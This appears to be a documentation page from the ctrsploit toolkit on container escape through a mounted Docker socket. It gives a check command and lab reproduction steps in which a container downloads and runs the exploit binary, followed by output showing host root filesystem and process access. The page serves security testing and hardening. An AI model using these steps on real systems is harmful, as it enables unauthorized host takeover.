# shared docker.sock

## 1. Vulnerability Overview

When the Docker socket (`/var/run/docker.sock`) is mounted inside a container, processes within the container can communicate with the Docker daemon on the host. This is equivalent to giving the container root privileges on the host system, as it can start new containers with arbitrary privileges (e.g., mounting the host's root filesystem), leading to a container escape.

## 2. Attack Scenarios

Insecure configuration

## 3. Prerequisites

* `/var/run/docker.sock` is mounted into the container.

## 4. Vulnerability Check

`ctrsploit vul shared-socket docker.sock checksec`

## 5. Reproduce

![](./video.svg)

### 5.1 Reproduce Environment

```shell
$ git clone https://github.com/ssst0n3/docker_archive.git
$ cd docker_archive/docker/v28.3.2
$ docker compose -f docker-compose.yml -f docker-compose.kvm.yml up -d
```

<details><summary>env details</summary>

```shell
root@localhost:~# docker --version
Docker version 28.3.2, build 578ccf6
root@localhost:~# containerd --version
containerd containerd.io 1.7.27 05044ec0a9a75232cad458027ca83437aae3f4da
root@localhost:~# runc --version
runc version 1.2.5
commit: v1.2.5-0-g59923ef
spec: 1.2.0
go: go1.23.7
libseccomp: 2.5.5
```

</details>

### 5.2 Reproduce Steps

```shell
root@localhost:~# docker run -ti -v /var/run/docker.sock:/var/run/docker.sock:ro busybox:latest 
/ # wget -q https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O /usr/bin/ctrsploit
/ # chmod +x /usr/bin/ctrsploit
/ # ctrsploit vul shared-socket docker.sock x
INFO[0000] creating container with image busybox:latest 
INFO[0000] container created: 0b4ecd9f56a6d2da4c91c735394a9e50b29a6e1707b50a1b52b124fffc40fb93 
INFO[0000] attaching container: 0b4ecd9f56a6d2da4c91c735394a9e50b29a6e1707b50a1b52b124fffc40fb93 
INFO[0000] starting container: 0b4ecd9f56a6d2da4c91c735394a9e50b29a6e1707b50a1b52b124fffc40fb93 
INFO[0000] waiting container: 0b4ecd9f56a6d2da4c91c735394a9e50b29a6e1707b50a1b52b124fffc40fb93 
# ls -lah /
ls -lah /
total 80K
drwxr-xr-x  21 root root 4.0K Jul 21 10:04 .
drwxr-xr-x  21 root root 4.0K Jul 21 10:04 ..
lrwxrwxrwx   1 root root    7 Apr 22  2024 bin -> usr/bin
drwxr-xr-x   2 root root 4.0K Mar 31  2024 bin.usr-is-merged
drwxr-xr-x   2 root root 4.0K Jul 21 10:03 boot
drwxr-xr-x  16 root root 3.8K Sep 16 06:52 dev
drwxr-xr-x  65 root root 4.0K Sep 16 06:52 etc
drwxr-xr-x   3 root root 4.0K Apr 15 14:11 home
lrwxrwxrwx   1 root root    7 Apr 22  2024 lib -> usr/lib
drwxr-xr-x   2 root root 4.0K Nov 14  2024 lib.usr-is-merged
lrwxrwxrwx   1 root root    9 Apr 22  2024 lib64 -> usr/lib64
drwx------   2 root root  16K Jul 21 10:03 lost+found
drwxr-xr-x   2 root root 4.0K Apr 15 14:04 media
drwxr-xr-x   2 root root 4.0K Apr 15 14:04 mnt
drwxr-xr-x   3 root root 4.0K Sep 16 06:52 opt
dr-xr-xr-x 164 root root    0 Sep 16 06:52 proc
drwx------   4 root root 4.0K Sep 16 06:52 root
drwxr-xr-x  19 root root  540 Sep 16 06:52 run
lrwxrwxrwx   1 root root    8 Apr 22  2024 sbin -> usr/sbin
drwxr-xr-x   2 root root 4.0K Mar 19 18:09 sbin.usr-is-merged
drwxr-xr-x   2 root root 4.0K Apr 15 14:04 srv
dr-xr-xr-x  13 root root    0 Sep 16 06:52 sys
drwxrwxrwt   9 root root 4.0K Sep 16 06:56 tmp
drwxr-xr-x  12 root root 4.0K Apr 15 14:04 usr
drwxr-xr-x  11 root root 4.0K Sep 16 06:52 var
# ps -ef 
ps -ef 
UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  0 06:52 ?        00:00:00 /sbin/init
root           2       0  0 06:52 ?        00:00:00 [kthreadd]
root           3       2  0 06:52 ?        00:00:00 [pool_workqueue_release]
root           4       2  0 06:52 ?        00:00:00 [kworker/R-rcu_g]
root           5       2  0 06:52 ?        00:00:00 [kworker/R-rcu_p]
root           6       2  0 06:52 ?        00:00:00 [kworker/R-slub_]
root           7       2  0 06:52 ?        00:00:00 [kworker/R-netns]
root           8       2  0 06:52 ?        00:00:00 [kworker/0:0-cgroup_destroy]
root           9       2  0 06:52 ?        00:00:00 [kworker/0:1-ipv6_addrconf]
root          10       2  0 06:52 ?        00:00:00 [kworker/0:0H-kblockd]
root          11       2  0 06:52 ?        00:00:00 [kworker/u4:0-events_unbound
root          12       2  0 06:52 ?        00:00:00 [kworker/R-mm_pe]
root          13       2  0 06:52 ?        00:00:00 [rcu_tasks_kthread]
root          14       2  0 06:52 ?        00:00:00 [rcu_tasks_rude_kthread]
root          15       2  0 06:52 ?        00:00:00 [rcu_tasks_trace_kthread]
root          16       2  0 06:52 ?        00:00:00 [ksoftirqd/0]
root          17       2  0 06:52 ?        00:00:00 [rcu_preempt]
root          18       2  0 06:52 ?        00:00:00 [migration/0]
root          19       2  0 06:52 ?        00:00:00 [idle_inject/0]
root          20       2  0 06:52 ?        00:00:00 [cpuhp/0]
root          21       2  0 06:52 ?        00:00:00 [cpuhp/1]
root          22       2  0 06:52 ?        00:00:00 [idle_inject/1]
root          23       2  0 06:52 ?        00:00:00 [migration/1]
root          24       2  0 06:52 ?        00:00:00 [ksoftirqd/1]
root          25       2  0 06:52 ?        00:00:00 [kworker/1:0-ata_sff]
root          26       2  0 06:52 ?        00:00:00 [kworker/1:0H-kblockd]
root          27       2  0 06:52 ?        00:00:00 [kdevtmpfs]
root          28       2  0 06:52 ?        00:00:00 [kworker/R-inet_]
root          29       2  0 06:52 ?        00:00:00 [kworker/u4:1-flush-8:0]
root          30       2  0 06:52 ?        00:00:00 [kauditd]
root          31       2  0 06:52 ?        00:00:00 [khungtaskd]
root          32       2  0 06:52 ?        00:00:00 [oom_reaper]
root          33       2  0 06:52 ?        00:00:00 [kworker/u4:2-events_unbound
root          34       2  0 06:52 ?        00:00:00 [kworker/R-write]
root          35       2  0 06:52 ?        00:00:00 [kcompactd0]
root          36       2  0 06:52 ?        00:00:00 [ksmd]
root          37       2  0 06:52 ?        00:00:00 [kworker/1:1-ipv6_addrconf]
root          38       2  0 06:52 ?        00:00:00 [khugepaged]
root          39       2  0 06:52 ?        00:00:00 [kworker/R-kinte]
root          40       2  0 06:52 ?        00:00:00 [kworker/R-kbloc]
root          41       2  0 06:52 ?        00:00:00 [kworker/R-blkcg]
root          42       2  0 06:52 ?        00:00:00 [irq/9-acpi]
root          43       2  0 06:52 ?        00:00:00 [kworker/R-tpm_d]
root          44       2  0 06:52 ?        00:00:00 [kworker/R-ata_s]
root          45       2  0 06:52 ?        00:00:00 [kworker/R-md]
root          46       2  0 06:52 ?        00:00:00 [kworker/R-md_bi]
root          47       2  0 06:52 ?        00:00:00 [kworker/R-edac-]
root          48       2  0 06:52 ?        00:00:00 [kworker/R-devfr]
root          49       2  0 06:52 ?        00:00:00 [watchdogd]
root          50       2  0 06:52 ?        00:00:00 [kworker/1:1H-kblockd]
root          51       2  0 06:52 ?        00:00:00 [kswapd0]
root          52       2  0 06:52 ?        00:00:00 [ecryptfs-kthread]
root          53       2  0 06:52 ?        00:00:00 [kworker/R-kthro]
root          54       2  0 06:52 ?        00:00:00 [kworker/R-acpi_]
root          55       2  0 06:52 ?        00:00:00 [scsi_eh_0]
root          56       2  0 06:52 ?        00:00:00 [kworker/R-scsi_]
root          57       2  0 06:52 ?        00:00:00 [scsi_eh_1]
root          58       2  0 06:52 ?        00:00:00 [kworker/R-scsi_]
root          59       2  0 06:52 ?        00:00:00 [kworker/u4:3-flush-8:0]
root          60       2  0 06:52 ?        00:00:00 [kworker/R-mld]
root          61       2  0 06:52 ?        00:00:00 [kworker/R-ipv6_]
root          68       2  0 06:52 ?        00:00:00 [kworker/R-kstrp]
root          70       2  0 06:52 ?        00:00:00 [kworker/u5:0]
root          83       2  0 06:52 ?        00:00:00 [kworker/R-charg]
root          84       2  0 06:52 ?        00:00:00 [kworker/0:1H-kblockd]
root         128       2  0 06:52 ?        00:00:00 [kworker/1:2-cgroup_destroy]
root         130       2  0 06:52 ?        00:00:00 [kworker/1:2H-kblockd]
root         131       2  0 06:52 ?        00:00:00 [kworker/0:2-cgroup_destroy]
root         152       2  0 06:52 ?        00:00:00 [jbd2/sda1-8]
root         153       2  0 06:52 ?        00:00:00 [kworker/R-ext4-]
root         181       2  0 06:52 ?        00:00:00 [psimon]
root         187       1  0 06:52 ?        00:00:00 /usr/lib/systemd/systemd-jou
root         228       2  0 06:52 ?        00:00:00 [kworker/1:3-events]
root         244       2  0 06:52 ?        00:00:00 [kworker/1:4-events]
root         252       1  0 06:52 ?        00:00:00 /usr/lib/systemd/systemd-ude
systemd+     269       1  0 06:52 ?        00:00:00 /usr/lib/systemd/systemd-res
systemd+     270       1  0 06:52 ?        00:00:00 /usr/lib/systemd/systemd-tim
root         308       2  0 06:52 ?        00:00:00 [psimon]
systemd+     317       1  0 06:52 ?        00:00:00 /usr/lib/systemd/systemd-net
message+     403       1  0 06:52 ?        00:00:00 @dbus-daemon --system --addr
root         407       1  0 06:52 ?        00:00:00 /usr/lib/systemd/systemd-log
root         414       1  0 06:52 tty1     00:00:00 /sbin/agetty -o -p -- \u --n
root         415       1  0 06:52 ttyS0    00:00:00 /sbin/agetty -o -p -- \u --k
root         416       1  0 06:52 ?        00:00:00 sshd: /usr/sbin/sshd -D [lis
root         419       1  0 06:52 ?        00:00:00 /usr/bin/containerd
root         431       1  0 06:52 ?        00:00:00 /usr/bin/dockerd -H fd:// --
root         453       2  0 06:52 ?        00:00:00 [kworker/u4:4-flush-8:0]
root         454       2  0 06:52 ?        00:00:00 [kworker/u4:5-events_unbound
root         455       2  0 06:52 ?        00:00:00 [kworker/u4:6-ext4-rsv-conve
root         634     416  0 06:52 ?        00:00:00 sshd: root@pts/0
root         638       1  0 06:52 ?        00:00:00 /usr/lib/systemd/systemd --u
root         639     638  0 06:52 ?        00:00:00 (sd-pam)
root         644       2  0 06:52 ?        00:00:00 [psimon]
root         656     634  0 06:52 pts/0    00:00:00 -bash
root         677       2  0 06:52 ?        00:00:00 [kworker/0:3-events]
root         709     656  0 06:55 pts/0    00:00:00 docker run -ti -v /var/run/d
root         732       1  0 06:55 ?        00:00:00 /usr/bin/containerd-shim-run
root         754     732  0 06:55 pts/0    00:00:00 sh
root         781     754  2 06:56 pts/0    00:00:00 ctrsploit vul shared-socket 
root         794       1  0 06:56 ?        00:00:00 /usr/bin/containerd-shim-run
root         816     794  0 06:56 pts/0    00:00:00 /bin/sh
root         839     816  0 06:57 pts/0    00:00:00 ps -ef
```

## 6. case

